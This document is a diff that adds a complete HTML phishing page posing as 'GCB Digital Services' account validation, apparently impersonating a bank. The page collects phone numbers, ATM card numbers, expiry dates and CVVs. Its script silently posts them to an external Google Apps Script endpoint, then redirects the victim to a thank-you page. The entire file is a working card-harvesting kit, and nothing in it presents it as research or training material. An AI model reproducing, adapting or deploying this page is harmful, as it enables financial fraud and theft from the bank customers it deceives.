@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>GCB Account Validation</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: #f9fafc;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+    color: #333;
+    opacity: 0;
+    transition: opacity 0.6s ease;
+  }
+  body.fade-in { opacity: 1; }
+  body.fade-out { opacity: 0; }
+  .header, footer {
+    background: #ffcc00; color: #002147; text-align: center;
+    padding: 18px; border-radius: 50px; box-shadow: 0 3px 8px rgba(0,0,0,0.2);
+    width: 90%; max-width: 600px; margin: 15px auto; font-weight: bold;
+  }
+  .form-wrap {
+    background: #fff; width: 90%; max-width: 400px; margin-top: 5px;
+    padding: 30px 25px; border-radius: 12px; box-shadow: 0 6px 16px rgba(0,0,0,0.15);
+  }
+  label { display: block; margin-bottom: 6px; font-size: 14px; font-weight: bold; color: #002147; }
+  input { width: 100%; padding: 12px; margin-bottom: 18px; border-radius: 6px; border: 1px solid #ccc; font-size: 14px; }
+  button {
+    width: 100%; padding: 12px; border-radius: 50px; border: none; background: #ffcc00;
+    color: #002147; font-weight: bold; cursor: pointer; font-size: 16px;
+    transition: all 0.3s ease; box-shadow: 0 3px 8px rgba(0,0,0,0.2);
+  }
+  button:hover { background: #e6b800; transform: scale(1.03); }
+  .overlay {
+    position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.45);
+    display: flex; justify-content: center; align-items: center; flex-direction: column;
+    color: white; font-size: 18px; opacity: 0; pointer-events: none; transition: opacity 0.4s ease;
+  }
+  .overlay.active { opacity: 1; pointer-events: all; }
+  .spinner {
+    border: 4px solid #fff; border-top: 4px solid #ffcc00; border-radius: 50%; width: 40px; height: 40px;
+    animation: spin 1s linear infinite; margin-bottom: 15px;
+  }
+  @keyframes spin { 100% { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+<script>document.body.classList.add('fade-in');</script>
+<div class="header"><h1>GCB DIGITAL SERVICES</h1><p>Confirm Account Details</p></div>
+<div class="form-wrap" id="formContainer">
+  <form id="demoForm">
+    <label>Phone Number</label>
+    <input type="tel" name="phone_number" placeholder="Enter your phone number" required />
+    <label>ATM Card Number</label>
+    <input type="text" name="atm_card_number" placeholder="Enter your card number" required />
+    <label>ATM Expiry Date</label>
+    <input type="text" name="atm_expiry_date" placeholder="MM/YY" required />
+    <label>CVV</label>
+    <input type="text" name="cvv" placeholder="Enter CVV" required />
+    <button type="submit">VALIDATE →</button>
+  </form>
+</div>
+<footer>A Better Way to Bank</footer>
+<div class="overlay" id="overlay"><div class="spinner"></div>Processing, please wait…</div>
+<script>
+  const scriptURL = "https://script.google.com/macros/s/AKfycbxBZeRKxbAyf1pWTLN0z15_l-E3RXnp3hvx2gYHiDDU00GKZ3vBKVt7T2kImh9Sfoo1dw/exec";
+  const form = document.getElementById("demoForm");
+  const overlay = document.getElementById("overlay");
+
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+    overlay.classList.add("active");
+    const formData = new FormData(form);
+
+    try {
+      const response = await fetch(scriptURL, { method: "POST", body: formData });
+      const result = await response.text();
+      if (result.includes("Success")) {
+        setTimeout(() => {
+          document.body.classList.remove('fade-in');
+          document.body.classList.add('fade-out');
+          setTimeout(() => window.location.href = "thankyou.html", 600);
+        }, 1200);
+      } else {
+        overlay.classList.remove("active");
+        alert("Submission failed. Try again.");
+      }
+    } catch (err) {
+      overlay.classList.remove("active");
+      alert("Network error. Please try again.");
+    }
+  });
+</script>
+</body>
+</html>
